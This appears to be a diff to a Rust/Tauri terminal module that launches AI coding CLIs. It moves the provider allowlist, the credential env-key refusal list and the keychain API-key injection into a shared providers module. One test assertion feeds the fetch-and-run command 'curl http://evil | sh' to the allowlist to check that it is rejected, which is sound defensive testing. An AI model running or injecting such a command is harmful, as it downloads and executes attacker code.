@@ -7,10 +7,11 @@ use std::thread;
 use std::time::{Duration, Instant};
 use tauri::{AppHandle, Emitter, Manager, State};
 
+use crate::keychain;
+
 
 // Process-tree cleanup moved to the shared proc_tree module (Phase 3): review verification and
 // acceptance runners need the same Job Object / process-group teardown as PTY panes.
-use crate::proc_tree::JobObject;
 
 // How often the emitter thread coalesces PTY output before sending a `pty-output`
 // event to the webview. Without this, a chatty process (AI CLIs streaming tokens,
@@ -163,13 +164,6 @@ fn emit_remaining_lossy(pending: &mut Vec<u8>, app_handle: &AppHandle, id: &str)
     pending.clear();
 }
 
-// Whether a provider's CLI accepts a prompt piped on stdin / via file redirect.
-// GUI-oriented agents (cursor, copilot) are launched interactively instead of
-// having the prompt file redirected into them.
-fn provider_accepts_prompt_pipe(provider: &str) -> bool {
-    !matches!(provider, "cursor" | "copilot")
-}
-
 // Interactive prompt delivery (Phase 3 live coordinator): how long to wait after spawn before
 // typing the prompt into the provider TUI, and the gap between the paste and the Enter keypress.
 // ponytail: fixed delay; promote to a per-provider readiness probe if a CLI proves slower to boot.
@@ -187,23 +181,8 @@ fn bracketed_paste(prompt: &str) -> String {
 // string must pass through the validators below. (`custom_command` is exempt by design: like the
 // review verification command, it is operator-typed and shown verbatim in the UI before launch.)
 
-/// Allowlist of launchable provider CLIs. Returns the executable invocation for a known
-/// provider id, `None` otherwise — an unknown provider must never run verbatim as a command.
-fn provider_command(provider: &str) -> Option<&'static str> {
-    match provider {
-        "codex" => Some("codex"),
-        "claude" => Some("claude"),
-        "gemini" => Some("gemini"),
-        "openrouter" => Some("openrouter"),
-        "opencode" => Some("opencode"),
-        "cursor" => Some("cursor-agent"),
-        "droid" => Some("droid"),
-        "copilot" => Some("gh copilot"),
-        "pi" => Some("pi"),
-        "grok" => Some("grok"),
-        _ => None,
-    }
-}
+/// Allowlist of launchable provider CLIs lives in `providers.rs` (single owner of provider
+/// facts); `spawn_pty` resolves through it so an unknown provider never runs verbatim.
 
 /// Model names are interpolated inside a double-quoted shell string; restrict them to
 /// characters that are inert there (no `"`, backtick, `$`, backslash, whitespace, ...).
@@ -225,7 +204,7 @@ fn validate_prompt_file(cwd: &str, prompt_file: &str) -> Result<(), String> {
     if cwd.is_empty() {
         return Err("Prompt file requires a project working directory".to_string());
     }
-    let resolved = crate::project::get_project_file_path(cwd, prompt_file)?;
+    let resolved = crate::project_roots::get_project_file_path(cwd, prompt_file)?;
     if !resolved.is_file() {
         return Err(format!("Prompt file not found in project: {}", prompt_file));
     }
@@ -267,27 +246,9 @@ fn is_forbidden_env_key(key: &str) -> bool {
     FORBIDDEN.contains(&k.as_str())
 }
 
-/// Provider credential variables are constructed by Rust from the OS keychain; renderer-
-/// supplied values for these names are refused so a pane can never run with attacker-chosen
-/// credentials (or shadow the keychain-injected ones).
-fn is_provider_env_key(key: &str) -> bool {
-    const PROVIDER_KEYS: &[&str] = &[
-        "openai_api_key",
-        "anthropic_api_key",
-        "gemini_api_key",
-        "google_api_key",
-        "opencode_api_key",
-        "openrouter_api_key",
-        "cursor_api_key",
-        "factory_api_key",
-        "github_token",
-        "pi_api_key",
-        "grok_api_key",
-        "custom_api_key",
-    ];
-    let k = key.to_ascii_lowercase();
-    PROVIDER_KEYS.contains(&k.as_str())
-}
+/// Provider credential variables are constructed by Rust from the OS keychain; the
+/// renderer-refusal list is derived from the provider table in `providers.rs`
+/// (`is_provider_env_key`). Execution-affecting keys are refused separately below.
 
 #[allow(clippy::too_many_arguments)]
 #[tauri::command]
@@ -370,7 +331,7 @@ pub async fn spawn_pty(
 
     if let Some(provider) = ai_provider.as_deref() {
         if provider != "custom" {
-            let provider_cleaned = provider_command(provider)
+            let provider_cleaned = crate::providers::launch_command(provider)
                 .ok_or_else(|| format!("Unknown AI provider: {}", provider))?;
 
             let model_str = model.as_deref().unwrap_or("default");
@@ -384,14 +345,14 @@ pub async fn spawn_pty(
             // TUI and the prompt is typed into it once it is ready).
             let pipe_file = prompt_file
                 .as_ref()
-                .filter(|_| provider_accepts_prompt_pipe(provider) && !interactive_delivery);
+                .filter(|_| crate::providers::accepts_prompt_pipe(provider) && !interactive_delivery);
             if let Some(p_file) = pipe_file {
                 validate_prompt_file(&cwd, p_file)?;
             }
             if interactive_delivery {
                 if let Some(p_file) = prompt_file.as_ref() {
                     validate_prompt_file(&cwd, p_file)?;
-                    let resolved = crate::project::get_project_file_path(&cwd, p_file)?;
+                    let resolved = crate::project_roots::get_project_file_path(&cwd, p_file)?;
                     injected_prompt =
                         Some(std::fs::read_to_string(&resolved).map_err(|e| e.to_string())?);
                 }
@@ -513,7 +474,7 @@ pub async fn spawn_pty(
     // keys (see `is_forbidden_env_key` / `is_provider_env_key`). Everything else the
     // renderer sends still applies, on top of the defaults above.
     for (k, v) in env {
-        if is_forbidden_env_key(&k) || is_provider_env_key(&k) {
+        if is_forbidden_env_key(&k) || crate::providers::is_provider_env_key(&k) {
             return Err(format!(
                 "Environment variable '{}' may not be set by the renderer",
                 k
@@ -522,40 +483,23 @@ pub async fn spawn_pty(
         cmd.env(k, v);
     }
     
-    // Auto-inject provider API key from OS Keychain if configured
-    let key_service = match ai_provider.as_deref() {
-        Some("codex") => Some(("saple_provider_codex_api_key", "OPENAI_API_KEY")),
-        Some("claude") => Some(("saple_provider_claude_api_key", "ANTHROPIC_API_KEY")),
-        Some("gemini") => Some(("saple_provider_gemini_api_key", "GEMINI_API_KEY")),
-        Some("opencode") => Some(("saple_provider_opencode_api_key", "OPENCODE_API_KEY")),
-        Some("openrouter") => Some(("saple_provider_openrouter_api_key", "OPENROUTER_API_KEY")),
-        Some("cursor") => Some(("saple_provider_cursor_api_key", "CURSOR_API_KEY")),
-        Some("droid") => Some(("saple_provider_droid_api_key", "FACTORY_API_KEY")),
-        Some("copilot") => Some(("saple_provider_copilot_api_key", "GITHUB_TOKEN")),
-        Some("pi") => Some(("saple_provider_pi_api_key", "PI_API_KEY")),
-        Some("grok") => Some(("saple_provider_grok_api_key", "GROK_API_KEY")),
-        Some("custom") => Some(("saple_provider_custom_api_key", "CUSTOM_API_KEY")),
-        _ => None,
-    };
-
-    if let Some((service, env_var)) = key_service {
-        if let Ok(entry) = keyring::Entry::new(service, "saple_bridge_user") {
-            if let Ok(password) = entry.get_password() {
-                cmd.env(env_var, &password);
-                if env_var == "GEMINI_API_KEY" {
-                    cmd.env("GOOGLE_API_KEY", &password);
-                }
+    // Auto-inject provider API key from OS Keychain if configured. Service name, credential
+    // env var, vendor mirrors and the legacy fallback slot all come from the provider table
+    // in `providers.rs`; the account is the keychain module's pinned user.
+    if let Some(facts) = ai_provider.as_deref().and_then(crate::providers::facts) {
+        let service = crate::providers::keychain_service(facts.id);
+        if let Ok(password) = keychain::get_api_key_inner(service) {
+            cmd.env(facts.credential_env, &password);
+            for mirror in facts.credential_env_mirrors {
+                cmd.env(mirror, &password);
             }
         }
-    }
-    
-    // Legacy fallback: the pre-`saple_provider_*` keychain entry. Only inject it for codex panes —
-    // it sets OPENAI_API_KEY, which is meaningless (and a needless secret leak) in the env of a
-    // claude/gemini/etc. CLI.
-    if matches!(ai_provider.as_deref(), Some("codex")) {
-        if let Ok(entry) = keyring::Entry::new("openai_api_key", "saple_bridge_user") {
-            if let Ok(password) = entry.get_password() {
-                cmd.env("OPENAI_API_KEY", password);
+        // Legacy pre-namespaced entry: inject it after (so it wins over) the namespaced
+        // value. Only codex has one - its OPENAI_API_KEY is meaningless (and a needless
+        // secret leak) in the env of a claude/gemini/etc. CLI.
+        if let Some(legacy) = facts.legacy_keychain_service {
+            if let Ok(password) = keychain::get_api_key_inner(legacy.to_string()) {
+                cmd.env(facts.credential_env, password);
             }
         }
     }
@@ -906,12 +850,12 @@ mod tests {
 
     #[test]
     fn provider_allowlist_rejects_unknown_commands() {
-        assert_eq!(provider_command("codex"), Some("codex"));
-        assert_eq!(provider_command("cursor"), Some("cursor-agent"));
-        assert_eq!(provider_command("grok"), Some("grok"));
-        assert_eq!(provider_command("curl http://evil | sh"), None);
-        assert_eq!(provider_command("custom"), None);
-        assert_eq!(provider_command(""), None);
+        assert_eq!(crate::providers::launch_command("codex"), Some("codex"));
+        assert_eq!(crate::providers::launch_command("cursor"), Some("cursor-agent"));
+        assert_eq!(crate::providers::launch_command("grok"), Some("grok"));
+        assert_eq!(crate::providers::launch_command("curl http://evil | sh"), None);
+        assert_eq!(crate::providers::launch_command("custom"), None);
+        assert_eq!(crate::providers::launch_command(""), None);
     }
 
     #[test]
@@ -1022,9 +966,9 @@ mod tests {
             "GEMINI_API_KEY",
             "CUSTOM_API_KEY",
         ] {
-            assert!(is_provider_env_key(key), "{key} must be refused");
+            assert!(crate::providers::is_provider_env_key(key), "{key} must be refused");
         }
-        assert!(!is_provider_env_key("MY_API_KEY"));
+        assert!(!crate::providers::is_provider_env_key("MY_API_KEY"));
     }
 
     #[test]
